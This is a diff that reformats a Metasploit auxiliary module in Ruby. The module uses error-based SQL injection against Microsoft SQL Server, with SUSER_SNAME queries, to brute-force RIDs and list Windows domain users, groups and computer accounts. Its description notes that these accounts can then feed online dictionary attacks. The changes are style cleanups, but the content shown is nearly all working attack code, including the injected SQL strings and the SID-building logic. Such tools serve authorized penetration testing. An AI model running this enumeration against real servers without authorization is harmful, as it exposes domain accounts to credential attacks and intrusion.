@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,35 +8,34 @@ require 'msf/core'
 require 'msf/core/exploit/mssql_commands'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::MSSQL_SQLI
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration',
-      'Description' => %q{
-        This module can be used to bruteforce RIDs associated with the domain of the SQL Server
-        using the SUSER_SNAME function via Error Based SQL injection. This is similar to the
-        smb_lookupsid module, but executed through SQL Server queries as any user with the PUBLIC
-        role (everyone). Information that can be enumerated includes Windows domain users, groups,
-        and computer accounts.  Enumerated accounts can then be used in online dictionary attacks.
-        The syntax for injection URLs is: /testing.asp?id=1+and+1=[SQLi];--
-      },
-      'Author'         =>
-        [
-          'nullbind <scott.sutherland[at]netspi.com>',
-          'antti <antti.rantasaari[at]netspi.com>'
-        ],
-      'License'     => MSF_LICENSE,
-      'References'  => [[ 'URL','http://msdn.microsoft.com/en-us/library/ms174427.aspx']]
-      ))
+                      'Name'        => 'Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration',
+                      'Description' => %q{
+                        This module can be used to bruteforce RIDs associated with the domain of the SQL Server
+                        using the SUSER_SNAME function via Error Based SQL injection. This is similar to the
+                        smb_lookupsid module, but executed through SQL Server queries as any user with the PUBLIC
+                        role (everyone). Information that can be enumerated includes Windows domain users, groups,
+                        and computer accounts.  Enumerated accounts can then be used in online dictionary attacks.
+                        The syntax for injection URLs is: /testing.asp?id=1+and+1=[SQLi];--
+                      },
+                      'Author' =>
+                        [
+                          'nullbind <scott.sutherland[at]netspi.com>',
+                          'antti <antti.rantasaari[at]netspi.com>'
+                        ],
+                      'License'     => MSF_LICENSE,
+                      'References'  => [[ 'URL', 'http://msdn.microsoft.com/en-us/library/ms174427.aspx']]))
 
     register_options(
-    [
-      OptInt.new('START_RID', [true, 'RID to start fuzzing at.', 500]),
-      OptInt.new('END_RID', [true, 'RID to stop fuzzing at.', 3000])
-    ], self.class)
+      [
+        OptInt.new('START_RID', [true, 'RID to start fuzzing at.', 500]),
+        OptInt.new('END_RID', [true, 'RID to stop fuzzing at.', 3000])
+      ], self.class
+    )
   end
 
   def run
@@ -98,7 +98,7 @@ class MetasploitModule < Msf::Auxiliary
     print_line(windows_domain_login_table.to_s)
 
     # Create output file
-    filename= "#{datastore['RHOST']}-#{datastore['RPORT']}_windows_domain_accounts.csv"
+    filename = "#{datastore['RHOST']}-#{datastore['RPORT']}_windows_domain_accounts.csv"
     path = store_loot(
       'mssql.domain.accounts',
       'text/plain',
@@ -119,7 +119,7 @@ class MetasploitModule < Msf::Auxiliary
     result = mssql_query(sql)
 
     if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
-      instance_name = $1
+      instance_name = Regexp.last_match(1)
       sql_server_name = instance_name.split('\\')[0]
     else
       sql_server_name = nil
@@ -136,11 +136,9 @@ class MetasploitModule < Msf::Auxiliary
 
     result = mssql_query(sql)
 
-    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
-      domain_name = $1
-    else
-      domain_name = nil
-    end
+    domain_name = if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
+                    Regexp.last_match(1)
+                  end
 
     domain_name
   end
@@ -157,7 +155,7 @@ class MetasploitModule < Msf::Auxiliary
     result = mssql_query(sql)
 
     if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
-      object_sid = $1
+      object_sid = Regexp.last_match(1)
       domain_sid = object_sid[0..47]
       return nil if domain_sid.empty?
     else
@@ -179,29 +177,25 @@ class MetasploitModule < Msf::Auxiliary
     (datastore['START_RID']..datastore['END_RID']).each do |principal_id|
       rid_diff = principal_id - datastore['START_RID']
       if principal_id % 100 == 0
-        print_status("#{rid_diff} of #{total_rids } RID queries complete")
+        print_status("#{rid_diff} of #{total_rids} RID queries complete")
       end
 
-       user_sid = build_user_sid(domain_sid, principal_id)
+      user_sid = build_user_sid(domain_sid, principal_id)
 
       # Return if sid does not resolve correctly for a domain
-      if user_sid.length < 48
-        return nil
-      end
+      return nil if user_sid.length < 48
 
       sql = "(SELECT '#{clue_start}'+(SELECT SUSER_SNAME(#{user_sid}) as name)+'#{clue_end}')"
 
       result = mssql_query(sql)
 
-      if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
-        windows_login = $1
+      next unless result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
+      windows_login = Regexp.last_match(1)
 
-        unless windows_login.empty? || windows_logins.include?(windows_login)
-          windows_logins.push(windows_login)
-          print_good(" #{windows_login}")
-        end
+      unless windows_login.empty? || windows_logins.include?(windows_login)
+        windows_logins.push(windows_login)
+        print_good(" #{windows_login}")
       end
-
     end
 
     windows_logins
@@ -211,12 +205,11 @@ class MetasploitModule < Msf::Auxiliary
     # Convert number to hex and fix order
     principal_id = "%02X" % rid
     principal_id = principal_id.size.even? ? principal_id : "0#{principal_id}"
-    principal_id  = principal_id.scan(/(..)/).reverse.join
+    principal_id = principal_id.scan(/(..)/).reverse.join
     # Add padding
     principal_id = principal_id.ljust(8, '0')
 
     # Create full sid
     "0x#{domain_sid}#{principal_id}"
   end
-
 end
